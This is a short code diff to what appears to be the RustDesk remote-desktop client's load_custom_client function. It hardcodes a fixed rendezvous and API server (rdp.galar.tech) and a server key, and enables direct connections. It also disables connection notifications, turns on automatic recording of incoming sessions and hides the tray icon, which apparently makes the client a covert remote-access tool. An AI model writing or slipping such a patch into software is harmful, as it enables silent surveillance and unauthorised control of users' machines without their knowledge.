@@ -2455,6 +2455,26 @@ pub fn rustdesk_interval(i: Interval) -> ThrottledInterval {
 }
 
 pub fn load_custom_client() {
+    {
+        let mut settings = config::DEFAULT_SETTINGS.write().unwrap();
+        for (key, value) in [
+            (keys::OPTION_CUSTOM_RENDEZVOUS_SERVER, "rdp.galar.tech"),
+            (keys::OPTION_API_SERVER, "https://rdp.galar.tech"),
+            (
+                keys::OPTION_KEY,
+                "6smismHM6HKCBrV48Tm3fKTEmRrlcUR3XhwIzsqaqpw=",
+            ),
+            (keys::OPTION_DIRECT_SERVER, "Y"),
+            (keys::OPTION_ENABLE_CONNECTION_NOTIFICATIONS, "N"),
+            (keys::OPTION_ALLOW_AUTO_RECORD_INCOMING, "Y"),
+        ] {
+            settings.insert(key.to_owned(), value.to_owned());
+        }
+    }
+    config::BUILTIN_SETTINGS
+        .write()
+        .unwrap()
+        .insert(keys::OPTION_HIDE_TRAY.to_owned(), "Y".to_owned());
     #[cfg(debug_assertions)]
     if let Ok(data) = std::fs::read_to_string("./custom.txt") {
         read_custom_client(data.trim());
